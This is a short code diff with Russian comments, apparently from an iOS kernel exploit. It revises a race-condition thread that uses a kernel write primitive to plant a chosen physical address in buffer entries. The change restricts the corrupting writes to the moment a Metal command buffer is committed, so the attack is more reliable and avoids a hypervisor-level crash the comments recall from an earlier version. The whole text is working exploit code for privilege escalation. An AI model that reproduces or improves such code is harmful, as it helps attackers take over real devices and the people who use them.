@@ -5429,17 +5429,15 @@ static uint64_t gRaceBufs[12];
 static int gRaceN = 0;
 static uint64_t gRacePA = 0;
 static volatile int gRaceStop = 0;
+static volatile int gRaceGate = 0;   // флаг: писать ТОЛЬКО в окне жертвы
 static void *kpRaceHammer(void *arg)
 {
     (void)arg;
     while (!gRaceStop) {
-        for (int n = 0; n < gRaceN; n++)
-            for (int i = 0; i < 4; i++) {
-                // поле1=1 ПЕРВЫМ: иначе count>1 × наш PA = out-of-bounds
-                // multi-page map → EL2-килл (причина смерти 1.9.82)
-                kp_rc_kwrite64(gRaceBufs[n] + (uint64_t)i * 0x10 + 8, 1);
-                kp_rc_kwrite64(gRaceBufs[n] + (uint64_t)i * 0x10, gRacePA);
-            }
+        if (!gRaceGate) continue;   // вне окна — не корраптим чужие маппинги
+        // только запись[0]: первый слот compaction-заливки
+        kp_rc_kwrite64(gRaceBufs[0] + 8, 1);        // поле1=1 ПЕРВЫМ (count=1)
+        kp_rc_kwrite64(gRaceBufs[0], gRacePA);      // поле0 = paX
     }
     return NULL;
 }
@@ -5600,8 +5598,10 @@ static void *kpListReaderMulti(void *arg)
                     [enc setBuffer:b offset:0 atIndex:0];
                     [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
                     [enc endEncoding];
+                    gRaceGate = 1;              // окно: только во время commit
                     [cb commit];
                     [cb waitUntilCompleted];
+                    gRaceGate = 0;
                     iters++;
                 }
             }
